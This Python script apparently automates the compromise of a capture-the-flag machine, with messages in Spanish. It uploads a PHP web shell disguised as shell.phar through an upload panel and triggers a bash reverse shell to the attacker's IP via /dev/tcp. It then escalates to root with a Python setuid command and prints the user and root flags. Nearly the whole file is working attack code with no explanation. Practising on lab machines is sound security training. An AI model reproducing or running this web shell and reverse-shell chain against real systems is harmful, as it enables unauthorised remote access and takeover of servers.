import requests
from pwn import *
from os import sys

if len(sys.argv) < 3:
    print(f'[!] Uso: python3 {sys.argv[0]} "Your_ip" "Target_IP"\n' )
    sys.exit(1)


url = f"http://{sys.argv[2]}/panel/" # Change victim IP
url_up = f"http://{sys.argv[2]}/uploads/"
progress = log.progress("Autopwn")

s = requests.Session()

def file_upload():

        payload = """  <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?> """ 

        data = {
                'submit' : "Upload"
            }

        files  = {'fileUpload':(f'shell.phar',payload),
                    
                }
        progress.status('Subiendo archivo php malicioso')
        sleep(2)
        r = s.post(url,files=files,data=data)

def conection():
    url_reverse = url_up + f"shell.phar?cmd=bash -c 'bash -i >%26 /dev/tcp/{sys.argv[1]}/1234 0>%261'"
    r = s.get(url_reverse)


if __name__ == '__main__':

    file_upload()
    progress.status('Enviando conexión reversa...')
    threading.Thread(target=conection, args=()).start()
    shell = listen(1234,timeout=10).wait_for_connection()
    shell.sendline("echo 'Ganando acceso como root...'")
    shell.sendline("cd /tmp")
    shell.sendline("echo 'import os ' > testing.py")
    shell.sendline("echo 'os.setuid(0)' >> testing.py")
    shell.sendline("""echo 'os.system("bash")' >> testing.py""")
    shell.sendline("python testing.py")
    shell.sendline("echo 'Listo, maquina rooteada, a continuacion las flags'")
    shell.sendline("cat /var/www/user.txt")
    shell.sendline("cat /root/root.txt")
    shell.interactive()
    
